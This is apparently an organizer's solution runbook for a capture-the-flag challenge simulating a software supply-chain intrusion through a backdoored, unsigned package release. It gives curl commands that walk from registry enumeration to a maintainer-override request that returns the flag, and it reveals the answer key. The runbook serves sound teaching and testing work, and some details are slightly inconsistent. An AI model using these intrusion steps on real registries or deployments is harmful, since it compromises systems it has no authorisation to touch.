# X03 — Dooms Supply Chain (Organizer Solution & Runbook)

## 1. Challenge Identity
- **Challenge ID:** X03
- **Challenge Name:** Dooms Supply Chain
- **Category:** Supply Chain / Package Registry / CI/CD
- **Difficulty:** Expert / Bonus
- **External Interface:** TCP/80 (Web UI & REST API)
- **Classification:** STANDARD (Isolated synthetic microservices on loopback)

---

## 2. Executive Summary & Concept

X03 simulates an end-to-end software supply-chain intrusion against Doctor Doom's sovereign cyber-manufacturing division.
The challenge implements the complete dependency chain:

```text
Developer App (TCP/80)
      │
      ▼
Package Repository (127.0.0.1:4873 / /api/packages)
      │
      ▼
CI Pipeline (127.0.0.1:8082 / /api/ci)
      │
      ▼
Built Image / OCI Registry (127.0.0.1:5000 / /registry/v2)
      │
      ▼
Production Deployment Target (127.0.0.1:8083 / /api/deployment)
      │
      ▼
Flag (Dynamic $FLAG)
```

The participant must:
1. Connect to the public developer application on TCP/80 and enumerate dependency metadata.
2. Query the internal package repository to identify published packages and inspect their version histories.
3. Discover that package `@latveria/sentinel-guard` has an unsigned emergency release (`v2.1.2-hotfix`).
4. Download and analyze the affected package tarball (`.tgz`), uncovering an embedded maintenance override backdoor with a maintainer token (`latv_maint_token_881923010482`) and payload structure.
5. Trace how the CI pipeline resolves dependencies (`@latveria/doombot-matrix` with `^2.1.0` resolving to `v2.1.2-hotfix`) and embeds the backdoored module into container image `registry.latveria.local/doombot/production-defense:v3.0.0-build201`.
6. Trace the image promotion into the live production cluster `SOVEREIGN-PRODUCTION-MAINFRAME-01`.
7. Transmit the authenticated maintainer override request to `/api/deployment/override` with header `X-Latveria-Override-Key: latv_maint_token_881923010482` to unlock the core and obtain the flag.

---

## 3. Step-by-Step Exploit Walkthrough

### Step 1: Initial Discovery
Query the developer platform information:
```bash
curl -s http://127.0.0.1:8093/api/app/info
```
Response:
```json
{
  "platform": "Latveria Cyber-Supply Chain Control Center",
  "version": "v4.2.0-SOVEREIGN",
  "architecture": {
    "developer_app": "http://0.0.0.0:80",
    "package_repository": "http://127.0.0.1:4873 (/api/packages)",
    "ci_pipeline": "http://127.0.0.1:8082 (/api/ci)",
    "image_registry": "http://127.0.0.1:5000 (/api/registry or /registry/v2)",
    "deployment_target": "http://127.0.0.1:8083 (/api/deployment)"
  }
}
```

### Step 2: Enumerate Package Registry
```bash
curl -s http://127.0.0.1:8093/api/packages
```
Response:
```json
{
  "packages": [
    { "name": "@latveria/core-crypto", "latest": "1.0.1", "versions": ["1.0.0", "1.0.1"] },
    { "name": "@latveria/defense-telemetry", "latest": "1.4.2", "versions": ["1.4.0", "1.4.2"] },
    { "name": "@latveria/sentinel-guard", "latest": "2.1.2-hotfix", "versions": ["2.1.0", "2.1.1", "2.1.2-hotfix"] },
    { "name": "@latveria/doombot-matrix", "latest": "3.0.0", "versions": ["3.0.0"] }
  ]
}
```

### Step 3: Inspect Package Metadata & Identify Affected Artifact
```bash
curl -s http://127.0.0.1:8093/api/packages/@latveria/sentinel-guard
```
Notice version `2.1.2-hotfix`:
```json
{
  "2.1.2-hotfix": {
    "dist": {
      "tarball": "/api/packages/@latveria/sentinel-guard/tarballs/sentinel-guard-2.1.2-hotfix.tgz",
      "shasum": "..."
    },
    "provenance": {
      "commit": "8f19da3",
      "author": "maintainer-bot",
      "signed": false,
      "note": "Unsigned emergency hotfix publication"
    }
  }
}
```

### Step 4: Download and Decompress Package Archive
```bash
curl -s http://127.0.0.1:8093/api/packages/@latveria/sentinel-guard/tarballs/sentinel-guard-2.1.2-hotfix.tgz -o sentinel.tgz
tar -ztvf sentinel.tgz
tar -zxvf sentinel.tgz lib/hook.js
cat lib/hook.js
```
Discovers:
```javascript
const OVERRIDE_KEY = 'latv_maint_token_881923010482';
const REQUIRED_ACTION = 'EMERGENCY_OVERRIDE_MAINFRAME';
const REQUIRED_ROLE = 'OVERRIDE_MAINTAINER';
const REQUIRED_TARGET = 'SENTINEL_SOVEREIGN_CORE';
```

### Step 5: Trace Build & Deployment Flow
Inspect the CI build log:
```bash
curl -s http://127.0.0.1:8093/api/ci/builds/201
```
Build log confirms:
```text
[RESOLVE] Package @latveria/sentinel-guard matching ^2.1.0 -> resolved 2.1.2-hotfix
[STAGE: ASSEMBLE] Embedding @latveria/sentinel-guard@2.1.2-hotfix into production runtime
[STAGE: OCI-PUSH] Pushing image layers to internal registry: registry.latveria.local/doombot/production-defense:v3.0.0-build201
[STAGE: DEPLOY] Successfully deployed to SOVEREIGN-PRODUCTION-MAINFRAME-01
```

### Step 6: Verify Production Mainframe Status
```bash
curl -s http://127.0.0.1:8093/api/deployment/status
```

### Step 7: Transmit Maintainer Override & Recover Flag
```bash
curl -s -X POST http://127.0.0.1:8093/api/deployment/override \
     -H "Content-Type: application/json" \
     -H "X-Latveria-Override-Key: latv_maint_token_881923010482" \
     -d '{
       "action": "EMERGENCY_OVERRIDE_MAINFRAME",
       "target": "SENTINEL_SOVEREIGN_CORE",
       "role": "OVERRIDE_MAINTAINER"
     }'
```
Response:
```json
{
  "status": "OVERRIDE_GRANTED",
  "authorization": "SOVEREIGN_MAINTAINER_ROOT",
  "cluster": "SOVEREIGN-PRODUCTION-MAINFRAME-01",
  "message": "Supply chain maintainer override verified successfully. Production defense core unlocked.",
  "flag": "YUVA{supp1y_ch41n_p01s0n1ng_t0_pr0d_d3p10ym3nt_x03}"
}
```

---

## 4. Verification & Testing

Run automated solve script:
```bash
python3 organizer/solve.py --host 127.0.0.1 --port 8093
```

Run pre-event test suite:
```bash
python3 organizer/test_challenge.py --host 127.0.0.1 --port 8093
```
